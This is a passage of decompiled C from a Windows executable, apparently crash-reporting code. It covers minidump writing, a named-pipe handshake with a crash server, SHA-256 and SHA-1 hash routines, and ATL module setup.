  code *local_5c;
  int *local_58;
  HANDLE local_54;
  PVOID local_50;
  PVOID local_4c;
  PVOID local_48;
  LPCVOID local_44;
  int local_3c;
  int *local_38;
  HANDLE local_34;
  int *local_30;
  int **local_2c;
  PVOID local_28;
  PVOID local_24;
  PVOID local_20;
  LPCVOID local_1c;
  uint local_c;
  
  local_c = DAT_00435980 ^ (uint)&stack0xfffffffc;
  local_34 = param_4;
  if (*(int *)((int)this + 0x68) != 0) {
    local_54 = CreateFileW(*(LPCWSTR *)((int)this + 0x60),0x40000000,0,(LPSECURITY_ATTRIBUTES)0x0,1,
                           0x80,(HANDLE)0x0);
    if (local_54 != (HANDLE)0xffffffff) {
      local_38 = local_80;
      local_68 = param_1;
      local_64 = param_2;
      local_60 = 0;
      local_3c = 0;
      local_20 = (PVOID)0x3;
      GetCurrentThreadId();
      iVar2 = local_3c;
      iVar7 = local_3c + 1;
      iVar1 = local_3c * 3;
      local_3c = iVar7;
      local_80[iVar1 + 2] = (int)&local_20;
      local_80[iVar2 * 3] = 0x47670001;
      local_80[iVar2 * 3 + 1] = 0xc;
      if (param_3 != 0) {
        local_3c = iVar2 + 2;
        local_80[iVar7 * 3] = 0x47670002;
        local_80[iVar7 * 3 + 1] = 0x308;
        local_80[iVar7 * 3 + 2] = param_3;
      }
      if (param_2 != 0) {
        local_44 = *(LPCVOID *)(*(int *)(param_2 + 4) + 0xb8);
        SVar4 = VirtualQueryEx(local_34,local_44,&local_9c,0x1c);
        if ((SVar4 != 0) && (local_9c.State == 0x1000)) {
          local_24 = (PVOID)((int)local_44 - 0x80);
          local_50 = local_24;
          local_4c = (PVOID)(((LPCVOID)0x7f < local_44) - 1);
          local_1c = (LPCVOID)((int)local_9c.BaseAddress >> 0x1f);
          local_28 = local_9c.BaseAddress;
          local_20 = local_9c.BaseAddress;
          if ((local_4c < local_1c) ||
             ((local_4c <= local_1c && (local_24 <= local_9c.BaseAddress)))) {
            ppvVar5 = &local_20;
          }
          else {
            ppvVar5 = &local_50;
          }
          local_24 = *ppvVar5;
          local_4c = ppvVar5[1];
          local_28 = (PVOID)(local_9c.RegionSize + (int)local_9c.BaseAddress);
          local_1c = (LPCVOID)((int)local_1c +
                              (uint)CARRY4(local_9c.RegionSize,(uint)local_9c.BaseAddress));
          local_20 = local_28;
          local_48 = (PVOID)((int)local_44 + 0x80);
          local_44 = (LPCVOID)(uint)((LPCVOID)0xffffff7f < local_44);
          if ((local_44 < local_1c) || ((local_44 <= local_1c && (local_48 <= local_28)))) {
            ppvVar5 = &local_48;
          }
          else {
            ppvVar5 = &local_20;
          }
          iVar1 = **(int **)((int)this + 0xc0);
          *(PVOID *)(iVar1 + 8) = local_24;
          *(PVOID *)(iVar1 + 0xc) = local_4c;
          *(int *)(iVar1 + 0x10) = (int)*ppvVar5 - (int)local_24;
        }
      }
      pvVar3 = local_34;
      hObject = local_54;
      local_2c = *(int ***)((int)this + 0xc0);
      local_30 = *local_2c;
      if ((local_30[2] | local_30[3]) == 0) {
        local_30 = (int *)*local_30;
      }
      local_58 = (int *)&local_30;
      ppcVar13 = &local_5c;
      local_5c = FUN_004150a6;
      piVar12 = &local_3c;
      uVar8 = -(uint)(param_2 != 0) & (uint)&local_68;
      uVar11 = *(undefined4 *)((int)this + 0x6c);
      pvVar10 = local_54;
      DVar6 = GetProcessId(local_34);
      (**(code **)((int)this + 0x68))(pvVar3,DVar6,pvVar10,uVar11,uVar8,piVar12,ppcVar13);
      CloseHandle(hObject);
    }
  }
  uVar9 = FUN_0041a954();
  return uVar9;
}



undefined8 __fastcall FUN_0041530a(int param_1)

{
  uint extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined2 extraout_DX;
  int extraout_EDX;
  void **ppvVar1;
  void *pvVar2;
  undefined8 uVar3;
  undefined2 local_23c [12];
  undefined4 local_224;
  undefined4 local_220;
  undefined4 uStack540;
  undefined4 uStack536;
  undefined4 local_214 [129];
  undefined2 local_e;
  uint local_8;
  
  local_8 = DAT_00435980 ^ (uint)&stack0xfffffffc;
  local_224 = 0;
  local_220 = 0;
  uStack540 = 0;
  uStack536 = 0;
  if (*(code **)(param_1 + 0x74) != (code *)0x0) {
    (**(code **)(param_1 + 0x74))(&local_224);
  }
  ppvVar1 = (void **)(param_1 + 0x28);
  uVar3 = FUN_004103fd(local_23c,(int)&local_224);
  FUN_00410d40(ppvVar1,(undefined4 *)uVar3);
  pvVar2 = (void *)0x0;
  FUN_0040ae40(local_23c,'\x01',(void *)0x0);
  if (7 < *(uint *)(param_1 + 0x3c)) {
    ppvVar1 = (void **)*ppvVar1;
  }
  *(void ***)(param_1 + 0x5c) = ppvVar1;
  FUN_00427488(extraout_ECX,extraout_EDX,local_214,0x104,L"%s\\%s.dmp",
               (char)*(undefined4 *)(param_1 + 0x58));
  local_e = 0;
  if ((short)local_214[0] != 0) {
    pvVar2 = (void *)FUN_0041c12a(extraout_ECX_00,extraout_DX);
  }
  ppvVar1 = (void **)(param_1 + 0x40);
  FID_conflict_assign(ppvVar1,local_214,pvVar2);
  if (7 < *(uint *)(param_1 + 0x54)) {
    ppvVar1 = (void **)*ppvVar1;
  }
  *(void ***)(param_1 + 0x60) = ppvVar1;
  uVar3 = FUN_0041a954();
  return uVar3;
}



void __thiscall FUN_004153e4(void *this,undefined4 *param_1)

{
  int *piVar1;
  code *pcVar2;
  int iVar3;
  
                    // WARNING: Load size is inaccurate
  piVar1 = *this;
  iVar3 = FUN_004154e1(piVar1,(int *)piVar1[1]);
  if ((undefined4 *)(iVar3 + 8) != (undefined4 *)0x0) {
    *(undefined4 *)(iVar3 + 8) = *param_1;
    *(undefined4 *)(iVar3 + 0xc) = param_1[1];
    *(undefined4 *)(iVar3 + 0x10) = param_1[2];
    *(undefined4 *)(iVar3 + 0x14) = param_1[3];
  }
  if (*(int *)((int)this + 4) != 0xaaaaaa9) {
    *(int *)((int)this + 4) = *(int *)((int)this + 4) + 1;
    piVar1[1] = iVar3;
    **(int **)(iVar3 + 4) = iVar3;
    return;
  }
  FUN_00422ea9(0xaaaaaa9,(short)iVar3);
  pcVar2 = (code *)swi(3);
  (*pcVar2)();
  return;
}



void FUN_0041543f(undefined4 *param_1)

{
  void *pvVar1;
  void **ppvVar2;
  undefined4 uVar3;
  undefined4 *puVar4;
  
  ppvVar2 = DAT_00437e04;
  puVar4 = (undefined4 *)DAT_00437e04[1];
  if ((param_1 < puVar4) && (*DAT_00437e04 < param_1 || (undefined4 *)*DAT_00437e04 == param_1)) {
    pvVar1 = *DAT_00437e04;
    if (puVar4 == (undefined4 *)DAT_00437e04[2]) {
      FUN_0040cd5e(DAT_00437e04);
    }
    puVar4 = (undefined4 *)ppvVar2[1];
    if (puVar4 == (undefined4 *)0x0) goto LAB_00415491;
    uVar3 = *(undefined4 *)((int)*ppvVar2 + ((int)param_1 - (int)pvVar1 >> 2) * 4);
  }
  else {
    if (puVar4 == (undefined4 *)DAT_00437e04[2]) {
      FUN_0040cd5e(DAT_00437e04);
    }
    puVar4 = (undefined4 *)ppvVar2[1];
    if (puVar4 == (undefined4 *)0x0) goto LAB_00415491;
    uVar3 = *param_1;
  }
  *puVar4 = uVar3;
LAB_00415491:
  ppvVar2[1] = (void *)((int)ppvVar2[1] + 4);
  return;
}



void * __fastcall FUN_0041549d(void *param_1)

{
  if (*(int *)((int)param_1 + 0x28) != 0) {
    CloseHandle(*(HANDLE *)((int)param_1 + 0x28));
  }
  if (*(int *)((int)param_1 + 0x2c) != 0) {
    CloseHandle(*(HANDLE *)((int)param_1 + 0x2c));
  }
  if (*(int *)((int)param_1 + 0x30) != 0) {
    CloseHandle(*(HANDLE *)((int)param_1 + 0x30));
  }
  FUN_0040ae40(param_1,'\x01',(void *)0x0);
  FID_conflict__free(param_1);
  return param_1;
}



void FUN_004154e1(int *param_1,int *param_2)

{
  code *pcVar1;
  int **ppiVar2;
  undefined8 uVar3;
  undefined4 uVar4;
  
  uVar4 = 0x18;
  uVar3 = FUN_00416f82(0x18);
  ppiVar2 = (int **)uVar3;
  if (ppiVar2 == (int **)0x0) {
    FUN_00422e78(uVar4,(int)((ulonglong)uVar3 >> 0x20));
    pcVar1 = (code *)swi(3);
    (*pcVar1)();
    return;
  }
  if (param_1 == (int *)0x0) {
    param_1 = (int *)ppiVar2;
    param_2 = (int *)ppiVar2;
  }
  *ppiVar2 = param_1;
  if (ppiVar2 + 1 != (int **)0x0) {
    ppiVar2[1] = param_2;
  }
  return;
}



undefined4 * __thiscall
FUN_00415515(void *this,undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,
            undefined4 param_5,undefined4 param_6,undefined4 *param_7)

{
  *(undefined4 *)((int)this + 4) = param_2;
  *(undefined4 *)((int)this + 8) = param_3;
  *(undefined4 *)((int)this + 0xc) = param_4;
  *(undefined4 *)((int)this + 0x10) = param_5;
  *(undefined4 *)((int)this + 0x14) = param_6;
  *(undefined4 *)this = 1;
  *(undefined4 *)((int)this + 0x18) = *param_7;
  *(undefined4 *)((int)this + 0x1c) = param_7[1];
  *(undefined4 *)((int)this + 0x20) = 0;
  *(undefined4 *)((int)this + 0x24) = 0;
  *(undefined4 *)((int)this + 0x28) = 0;
  return (undefined4 *)this;
}



undefined2 * __fastcall
FUN_0041555d(undefined2 *param_1,undefined2 param_2,undefined4 *param_3,undefined4 param_4,
            undefined4 *param_5)

{
  basic_string__(param_1,param_2,param_3);
  *(undefined4 *)(param_1 + 0xc) = 0;
  *(undefined4 *)(param_1 + 0xe) = 0;
  *(undefined4 *)(param_1 + 0x10) = 0;
  *(undefined4 *)(param_1 + 0x12) = param_4;
  *(undefined4 *)(param_1 + 0x14) = 0;
  *(undefined4 *)(param_1 + 0x16) = 0;
  *(undefined4 *)(param_1 + 0x18) = 0;
  *(undefined4 *)(param_1 + 0x1a) = 0;
  *(undefined4 *)(param_1 + 0x1c) = 0;
  *(undefined4 *)(param_1 + 0x1e) = 0;
  FUN_00416e80((uint *)(param_1 + 0x20),0,0x308);
  if (param_5 != (undefined4 *)0x0) {
    *(undefined4 *)(param_1 + 0xe) = *param_5;
    *(undefined4 *)(param_1 + 0x10) = param_5[1];
  }
  return param_1;
}



HANDLE __fastcall FUN_004155b9(undefined4 *param_1)

{
  DWORD DVar1;
  HANDLE hNamedPipe;
  BOOL BVar2;
  undefined4 *lpFileName;
  undefined4 *local_c;
  undefined4 *local_8;
  
  lpFileName = param_1;
  if (7 < (uint)param_1[5]) {
    lpFileName = (undefined4 *)*param_1;
  }
  hNamedPipe = (HANDLE)param_1[6];
  if (hNamedPipe == (HANDLE)0x0) {
    local_8 = (undefined4 *)0x0;
    local_c = param_1;
    do {
      hNamedPipe = CreateFileW((LPCWSTR)lpFileName,0x103,0,(LPSECURITY_ATTRIBUTES)0x0,3,0x110000,
                               (HANDLE)0x0);
      if (hNamedPipe != (HANDLE)0xffffffff) goto LAB_00415626;
      DVar1 = GetLastError();
    } while (((DVar1 == 0xe7) && (BVar2 = WaitNamedPipeW((LPCWSTR)lpFileName,2000), BVar2 != 0)) &&
            (local_8 = (undefined4 *)((int)local_8 + 1), (int)local_8 < 2));
    hNamedPipe = (HANDLE)0x0;
  }
  else {
    param_1[6] = 0;
    local_8 = param_1;
  }
LAB_00415626:
  if (hNamedPipe == (HANDLE)0x0) {
    hNamedPipe = (HANDLE)0x0;
  }
  else {
    local_c = (undefined4 *)0x2;
    BVar2 = SetNamedPipeHandleState(hNamedPipe,(LPDWORD)&local_c,(LPDWORD)0x0,(LPDWORD)0x0);
    if (BVar2 == 0) {
      CloseHandle(hNamedPipe);
      hNamedPipe = (HANDLE)0x0;
    }
  }
  return hNamedPipe;
}



uint __thiscall FUN_00415658(void *this,HANDLE param_1)

{
  DWORD DVar1;
  uint uVar2;
  undefined4 extraout_ECX;
  undefined4 uVar3;
  int iVar4;
  int iVar5;
  int iVar6;
  undefined4 *puVar7;
  undefined local_8c [44];
  undefined4 local_60 [11];
  int local_34;
  int local_30;
  int local_14;
  int local_10;
  int local_c;
  DWORD local_8;
  
  puVar7 = (undefined4 *)((int)this + 0x1c);
  iVar6 = (int)this + 0x40;
  iVar5 = (int)this + 0x3c;
  iVar4 = (int)this + 0x38;
  uVar3 = *(undefined4 *)((int)this + 0x24);
  DVar1 = GetCurrentProcessId();
  FUN_00415515(local_8c,extraout_ECX,DVar1,uVar3,iVar4,iVar5,iVar6,puVar7);
  FUN_0040f617(&local_34);
  local_8 = 0;
  uVar2 = TransactNamedPipe(param_1,local_8c,0x2c,&local_34,0x2c,&local_8,(LPOVERLAPPED)0x0);
  if ((((uVar2 != 0) && (local_34 == 2)) && (local_30 != 0)) &&
     (((local_14 != 0 && (local_10 != 0)) && (local_c != 0)))) {
    FUN_0040f617(local_60);
    local_60[0] = 3;
    uVar2 = WriteFile(param_1,local_60,0x2c,&local_8,(LPOVERLAPPED)0x0);
    if (uVar2 != 0) {
      *(int *)((int)this + 0x28) = local_14;
      *(int *)((int)this + 0x2c) = local_10;
      *(int *)((int)this + 0x30) = local_c;
      *(int *)((int)this + 0x34) = local_30;
      return CONCAT31((int3)((uint)local_30 >> 8),1);
    }
  }
  return uVar2 & 0xffffff00;
}



uint __thiscall FUN_00415726(void *this,undefined4 param_1,void *param_2)

{
  uint in_EAX;
  DWORD DVar1;
  uint uVar2;
  
  if (*(int *)((int)this + 0x28) == 0) {
    uVar2 = in_EAX & 0xffffff00;
  }
  else {
    *(undefined4 *)((int)this + 0x3c) = param_1;
    DVar1 = GetCurrentThreadId();
    *(DWORD *)((int)this + 0x38) = DVar1;
    if (param_2 == (void *)0x0) {
      FUN_00416e80((uint *)((int)this + 0x40),0,0x308);
    }
    else {
      FID_conflict__memcpy((uint *)((int)this + 0x40),param_2,0x308);
    }
    uVar2 = FUN_00415775(this);
  }
  return uVar2;
}



uint __fastcall FUN_00415775(HANDLE param_1)

{
  uint uVar1;
  DWORD DVar2;
  HANDLE local_c;
  HANDLE local_8;
  
  local_c = param_1;
  local_8 = param_1;
  uVar1 = ResetEvent(*(HANDLE *)((int)param_1 + 0x2c));
  if ((uVar1 != 0) && (uVar1 = SetEvent(*(HANDLE *)((int)param_1 + 0x28)), uVar1 != 0)) {
    local_c = *(HANDLE *)((int)param_1 + 0x2c);
    local_8 = *(HANDLE *)((int)param_1 + 0x30);
    DVar2 = WaitForMultipleObjects(2,&local_c,0,15000);
    return (uint)(DVar2 == 0);
  }
  return uVar1 & 0xffffff00;
}



undefined8 __fastcall FUN_004157c4(int param_1)

{
  int *piVar1;
  uint uVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  uint uVar6;
  byte *pbVar7;
  int iVar8;
  uint *puVar9;
  int iVar10;
  uint uVar11;
  undefined8 uVar12;
  uint local_124;
  uint local_120;
  uint local_11c;
  uint local_118;
  uint local_114;
  uint local_110 [66];
  uint local_8;
  
  local_8 = DAT_00435980 ^ (uint)&stack0xfffffffc;
  iVar10 = 0;
  pbVar7 = (byte *)(param_1 + 0x10);
  do {
    local_110[iVar10 + 2] =
         (uint)*pbVar7 << 0x18 | (uint)pbVar7[1] << 0x10 | (uint)pbVar7[2] << 8 | (uint)pbVar7[3];
    iVar10 = iVar10 + 1;
    pbVar7 = pbVar7 + 4;
  } while (iVar10 < 0x10);
  if (iVar10 < 0x40) {
    local_110[1] = 0x40 - iVar10;
    puVar9 = local_110 + iVar10;
    do {
      uVar2 = *puVar9;
      uVar11 = puVar9[-0xd];
      puVar9[2] = ((uVar2 << 0xf | uVar2 >> 0x11) ^ (uVar2 << 0xd | uVar2 >> 0x13) ^ uVar2 >> 10) +
                  ((uVar11 << 0xe | uVar11 >> 0x12) ^ (uVar11 >> 7 | uVar11 << 0x19) ^ uVar11 >> 3)
                  + puVar9[-0xe] + puVar9[-5];
      local_110[1] = local_110[1] + -1;
      puVar9 = puVar9 + 1;
    } while (local_110[1] != 0);
  }
  iVar10 = 0;
  local_120 = *(uint *)(param_1 + 0x58);
  local_124 = *(uint *)(param_1 + 0x5c);
  local_110[0] = *(uint *)(param_1 + 100);
  local_114 = *(uint *)(param_1 + 0x68);
  local_110[1] = *(uint *)(param_1 + 0x6c);
  uVar2 = *(uint *)(param_1 + 0x50);
  uVar11 = *(uint *)(param_1 + 0x54);
  uVar6 = *(uint *)(param_1 + 0x60);
  do {
    local_118 = uVar6;
    local_11c = uVar11;
    uVar11 = uVar2;
    uVar5 = local_110[0];
    uVar4 = local_114;
    uVar3 = local_120;
    piVar1 = (int *)((int)&DAT_0042ed70 + iVar10);
    iVar8 = iVar10 + 8;
    iVar10 = iVar10 + 4;
    iVar8 = ((local_118 >> 0xb | local_118 << 0x15) ^ (local_118 << 7 | local_118 >> 0x19) ^
            (local_118 >> 6 | local_118 << 0x1a)) +
            (~local_118 & local_114 ^ local_110[0] & local_118) + *piVar1 +
            *(int *)((int)local_110 + iVar8) + local_110[1];
    local_110[1] = local_114;
    uVar6 = local_124 + iVar8;
    local_114 = local_110[0];
    local_110[0] = local_118;
    local_124 = local_120;
    uVar2 = iVar8 + ((uVar11 >> 0xd | uVar11 << 0x13) ^ (uVar11 << 10 | uVar11 >> 0x16) ^
                    (uVar11 >> 2 | uVar11 << 0x1e)) +
                    ((local_11c ^ uVar11) & local_120 ^ local_11c & uVar11);
    local_120 = local_11c;
  } while (iVar10 < 0x100);
  *(int *)(param_1 + 0x60) = *(int *)(param_1 + 0x60) + uVar6;
  *(int *)(param_1 + 0x54) = *(int *)(param_1 + 0x54) + uVar11;
  *(int *)(param_1 + 100) = *(int *)(param_1 + 100) + local_118;
  *(int *)(param_1 + 0x58) = *(int *)(param_1 + 0x58) + local_11c;
  *(int *)(param_1 + 0x68) = *(int *)(param_1 + 0x68) + uVar5;
  *(int *)(param_1 + 0x6c) = *(int *)(param_1 + 0x6c) + uVar4;
  *(int *)(param_1 + 0x5c) = *(int *)(param_1 + 0x5c) + uVar3;
  *(uint *)(param_1 + 0x50) = *(uint *)(param_1 + 0x50) + uVar2;
  uVar12 = FUN_0041a954();
  return uVar12;
}



void __cdecl FUN_004159e7(undefined4 *param_1)

{
  *param_1 = &PTR_FUN_0042ee70;
  param_1[0x14] = 0x6a09e667;
  param_1[0x15] = 0xbb67ae85;
  param_1[0x16] = 0x3c6ef372;
  param_1[0x17] = 0xa54ff53a;
  param_1[0x18] = 0x510e527f;
  param_1[0x19] = 0x9b05688c;
  param_1[0x1a] = 0x1f83d9ab;
  param_1[0x1b] = 0x5be0cd19;
  param_1[2] = 0;
  param_1[3] = 0;
  return;
}



void __cdecl FUN_00415a35(int param_1,undefined *param_2,uint param_3)

{
  uint *puVar1;
  uint uVar2;
  uint uVar3;
  
  uVar3 = *(uint *)(param_1 + 8) & 0x3f;
  puVar1 = (uint *)(param_1 + 8);
  uVar2 = *puVar1;
  *puVar1 = *puVar1 + param_3;
  *(int *)(param_1 + 0xc) = *(int *)(param_1 + 0xc) + (uint)CARRY4(uVar2,param_3);
  while (param_3 != 0) {
    param_3 = param_3 - 1;
    *(undefined *)(param_1 + 0x10 + uVar3) = *param_2;
    uVar3 = uVar3 + 1;
    param_2 = param_2 + 1;
    if (uVar3 == 0x40) {
      FUN_004157c4(param_1);
      uVar3 = 0;
    }
  }
  return;
}



undefined * __cdecl FUN_00415a73(uint param_1)

{
  undefined *puVar1;
  int iVar2;
  uint uVar3;
  undefined4 uVar4;
  uint uVar5;
  byte bVar6;
  uint uVar7;
  int iVar8;
  undefined *puVar9;
  undefined4 *puVar10;
  
  uVar5 = param_1;
  iVar2 = *(int *)(param_1 + 0xc);
  puVar1 = (undefined *)(param_1 + 0x10);
  uVar3 = *(uint *)(param_1 + 8);
  FUN_00415a35(param_1,&DAT_00431fb0,1);
  while (uVar7 = *(uint *)(uVar5 + 8) & 0x3f, uVar7 != 0x38) {
    FUN_00415a35(uVar5,(undefined *)&DAT_0042f178,1);
  }
  iVar8 = 8;
  do {
    bVar6 = FUN_0041d520(uVar7,iVar2 << 3 | uVar3 >> 0x1d);
    param_1 = param_1 & 0xffffff | (uint)bVar6 << 0x18;
    FUN_00415a35(uVar5,(undefined *)((int)&param_1 + 3),1);
    uVar7 = uVar7 - 8;
  } while (-8 < (int)uVar7);
  puVar10 = (undefined4 *)(uVar5 + 0x50);
  puVar9 = puVar1;
  do {
    uVar4 = *puVar10;
    puVar10 = puVar10 + 1;
    *puVar9 = (char)((uint)uVar4 >> 0x18);
    puVar9[1] = (char)((uint)uVar4 >> 0x10);
    puVar9[2] = (char)((uint)uVar4 >> 8);
    puVar9[3] = (char)uVar4;
    iVar8 = iVar8 + -1;
    puVar9 = puVar9 + 4;
  } while (iVar8 != 0);
  return puVar1;
}



undefined8 __cdecl FUN_00415b2b(undefined *param_1,uint param_2,void *param_3)

{
  undefined *_Src;
  undefined8 uVar1;
  size_t _Size;
  undefined4 local_80 [29];
  uint local_c;
  
  local_c = DAT_00435980 ^ (uint)local_80;
  FUN_004159e7(local_80);
  FUN_00415a35((int)local_80,param_1,param_2);
  _Size = 0x20;
  _Src = FUN_00415a73((uint)local_80);
  FID_conflict__memcpy(param_3,_Src,_Size);
  uVar1 = FUN_0041a954();
  return uVar1;
}



undefined8 __fastcall FUN_00415b92(int param_1)

{
  uint uVar1;
  uint uVar2;
  uint uVar3;
  uint *puVar4;
  uint uVar5;
  byte *pbVar6;
  int iVar7;
  int iVar8;
  int iVar9;
  uint uVar10;
  uint uVar11;
  uint uVar12;
  undefined8 uVar13;
  uint auStack384 [5];
  undefined4 uStack364;
  uint local_150;
  uint auStack328 [80];
  uint local_8;
  
  local_8 = DAT_00435980 ^ (uint)&stack0xfffffffc;
  iVar8 = 0;
  iVar9 = 0;
  pbVar6 = (byte *)(param_1 + 0x10);
  do {
    auStack328[iVar9] =
         (uint)*pbVar6 << 0x18 | (uint)pbVar6[1] << 0x10 | (uint)pbVar6[2] << 8 | (uint)pbVar6[3];
    iVar9 = iVar9 + 1;
    pbVar6 = pbVar6 + 4;
  } while (iVar9 < 0x10);
  if (iVar9 < 0x50) {
    uStack364 = 0x50;
    iVar7 = 0x50 - iVar9;
    puVar4 = auStack384 + iVar9;
    do {
      uVar2 = puVar4[0xb] ^ puVar4[6] ^ puVar4[-2] ^ *puVar4;
      puVar4[0xe] = uVar2 << 1 | (uint)((int)uVar2 < 0);
      iVar7 = iVar7 + -1;
      puVar4 = puVar4 + 1;
    } while (iVar7 != 0);
  }
  uVar2 = *(uint *)(param_1 + 0x60);
  uVar1 = *(uint *)(param_1 + 0x5c);
  uVar11 = *(uint *)(param_1 + 0x58);
  uVar12 = *(uint *)(param_1 + 0x54);
  uVar3 = *(uint *)(param_1 + 0x50);
  do {
    local_150 = uVar3;
    uVar10 = uVar11;
    uVar5 = uVar1;
    if (iVar8 < 0x14) {
      iVar9 = ((uVar5 ^ uVar10) & uVar12 ^ uVar5) + 0x5a827999;
    }
    else if (iVar8 < 0x28) {
      iVar9 = (uVar5 ^ uVar10 ^ uVar12) + 0x6ed9eba1;
    }
    else if (iVar8 < 0x3c) {
      iVar9 = (uVar10 & uVar12 | (uVar10 | uVar12) & uVar5) + 0x8f1bbcdc;
    }
    else {
      iVar9 = (uVar5 ^ uVar10 ^ uVar12) + 0xca62c1d6;
    }
    uVar3 = iVar9 + (local_150 << 5 | local_150 >> 0x1b) + auStack328[iVar8] + uVar2;
    uVar11 = uVar12 >> 2 | uVar12 << 0x1e;
    iVar8 = iVar8 + 1;
    uVar2 = uVar5;
    uVar1 = uVar10;
    uVar12 = local_150;
  } while (iVar8 < 0x50);
  *(int *)(param_1 + 0x5c) = *(int *)(param_1 + 0x5c) + uVar10;
  *(int *)(param_1 + 0x58) = *(int *)(param_1 + 0x58) + uVar11;
  *(int *)(param_1 + 0x60) = *(int *)(param_1 + 0x60) + uVar5;
  *(uint *)(param_1 + 0x50) = uVar3 + *(uint *)(param_1 + 0x50);
  *(int *)(param_1 + 0x54) = *(int *)(param_1 + 0x54) + local_150;
  uVar13 = FUN_0041a954();
  return uVar13;
}



void __cdecl FUN_00415d0b(undefined4 *param_1)

{
  *param_1 = &PTR_FUN_0042ee84;
  param_1[0x14] = 0x67452301;
  param_1[0x15] = 0xefcdab89;
  param_1[0x16] = 0x98badcfe;
  param_1[0x17] = 0x10325476;
  param_1[0x18] = 0xc3d2e1f0;
  param_1[2] = 0;
  param_1[3] = 0;
  return;
}



void __cdecl FUN_00415d44(int param_1,undefined *param_2,uint param_3)

{
  uint *puVar1;
  uint uVar2;
  uint uVar3;
  
  uVar3 = *(uint *)(param_1 + 8) & 0x3f;
  puVar1 = (uint *)(param_1 + 8);
  uVar2 = *puVar1;
  *puVar1 = *puVar1 + param_3;
  *(int *)(param_1 + 0xc) = *(int *)(param_1 + 0xc) + (uint)CARRY4(uVar2,param_3);
  while (param_3 != 0) {
    param_3 = param_3 - 1;
    *(undefined *)(param_1 + 0x10 + uVar3) = *param_2;
    uVar3 = uVar3 + 1;
    param_2 = param_2 + 1;
    if (uVar3 == 0x40) {
      FUN_00415b92(param_1);
      uVar3 = 0;
    }
  }
  return;
}



undefined * __cdecl FUN_00415d82(uint param_1)

{
  undefined *puVar1;
  uint uVar2;
  uint uVar3;
  undefined4 uVar4;
  uint uVar5;
  byte bVar6;
  int iVar7;
  int iVar8;
  undefined *puVar9;
  undefined4 *puVar10;
  
  uVar5 = param_1;
  iVar8 = *(int *)(param_1 + 0xc);
  puVar1 = (undefined *)(param_1 + 0x10);
  uVar2 = *(uint *)(param_1 + 8);
  param_1 = uVar2 << 3;
  FUN_00415d44(uVar5,&DAT_00431fb0,1);
  iVar7 = 0x38;
  uVar3 = *(uint *)(uVar5 + 8);
  while ((uVar3 & 0x3f) != 0x38) {
    FUN_00415d44(uVar5,(undefined *)&DAT_0042f178,1);
    uVar3 = *(uint *)(uVar5 + 8);
  }
  do {
    bVar6 = FUN_0041d520(iVar7,iVar8 << 3 | uVar2 >> 0x1d);
    param_1 = param_1 & 0xffffff | (uint)bVar6 << 0x18;
    FUN_00415d44(uVar5,(undefined *)((int)&param_1 + 3),1);
    iVar7 = iVar7 + -8;
  } while (-8 < iVar7);
  puVar10 = (undefined4 *)(uVar5 + 0x50);
  iVar8 = 5;
  puVar9 = puVar1;
  do {
    uVar4 = *puVar10;
    puVar10 = puVar10 + 1;
    *puVar9 = (char)((uint)uVar4 >> 0x18);
    puVar9[1] = (char)((uint)uVar4 >> 0x10);
    puVar9[2] = (char)((uint)uVar4 >> 8);
    puVar9[3] = (char)uVar4;
    iVar8 = iVar8 + -1;
    puVar9 = puVar9 + 4;
  } while (iVar8 != 0);
  return puVar1;
}



undefined8 __cdecl FUN_00415e4e(undefined *param_1,uint param_2,void *param_3)

{
  undefined *_Src;
  undefined8 uVar1;
  size_t _Size;
  undefined4 local_80 [29];
  uint local_c;
  
  local_c = DAT_00435980 ^ (uint)local_80;
  FUN_00415d0b(local_80);
  FUN_00415d44((int)local_80,param_1,param_2);
  _Size = 0x14;
  _Src = FUN_00415d82((uint)local_80);
  FID_conflict__memcpy(param_3,_Src,_Size);
  uVar1 = FUN_0041a954();
  return uVar1;
}



// Library Function - Single Match
//  public: __thiscall ATL::CAtlBaseModule::CAtlBaseModule(void)
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release, Visual Studio 2019 Release

CAtlBaseModule * __thiscall ATL::CAtlBaseModule::CAtlBaseModule(CAtlBaseModule *this)

{
  long lVar1;
  BOOL BVar2;
  
  _ATL_BASE_MODULE70::_ATL_BASE_MODULE70((_ATL_BASE_MODULE70 *)this);
  *(undefined4 *)this = 0x38;
  *(undefined4 *)(this + 8) = 0x400000;
  *(undefined4 *)(this + 4) = 0x400000;
  *(undefined4 *)(this + 0xc) = 0xc00;
  *(undefined **)(this + 0x10) = &DAT_004284b8;
  lVar1 = CComCriticalSection::Init((CComCriticalSection *)(this + 0x14));
  if (lVar1 < 0) {
    BVar2 = IsDebuggerPresent();
    if (BVar2 != 0) {
      OutputDebugStringW(L"ERROR : Unable to initialize critical section in CAtlBaseModule\n");
    }
    DAT_00437b5c = 1;
  }
  return this;
}



// Library Function - Single Match
//  public: __thiscall ATL::_ATL_BASE_MODULE70::_ATL_BASE_MODULE70(void)
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release, Visual Studio 2019 Release

_ATL_BASE_MODULE70 * __thiscall
ATL::_ATL_BASE_MODULE70::_ATL_BASE_MODULE70(_ATL_BASE_MODULE70 *this)

{
  FUN_00416e80((uint *)(this + 0x14),0,0x18);
  *(undefined4 *)(this + 0x2c) = 0;
  *(undefined4 *)(this + 0x30) = 0;
  *(undefined4 *)(this + 0x34) = 0;
  return this;
}



// Library Function - Single Match
//  public: __thiscall ATL::CAtlBaseModule::~CAtlBaseModule(void)
// 
// Libraries: Visual Studio 2012 Release, Visual Studio 2015 Release, Visual Studio 2017 Release,
// Visual Studio 2019 Release

void __thiscall ATL::CAtlBaseModule::_CAtlBaseModule(CAtlBaseModule *this)

{
  DeleteCriticalSection((LPCRITICAL_SECTION)(this + 0x14));
  CSimpleArray<struct_HINSTANCE__*,class_ATL::CSimpleArrayEqualHelper<struct_HINSTANCE__*>_>::
  RemoveAll((CSimpleArray_struct_HINSTANCE____class_ATL__CSimpleArrayEqualHelper_struct_HINSTANCE______
             *)(this + 0x2c));
  return;
}



// Library Function - Single Match
//  public: struct HINSTANCE__ * & __thiscall ATL::CSimpleArray<struct HINSTANCE__ *,class
// ATL::CSimpleArrayEqualHelper<struct HINSTANCE__ *>>::operator[](int)
// 
// Libraries: Visual Studio 2012 Release, Visual Studio 2015 Release

HINSTANCE__ ** __thiscall
ATL::CSimpleArray<struct_HINSTANCE__*,class_ATL::CSimpleArrayEqualHelper<struct_HINSTANCE__*>_>::
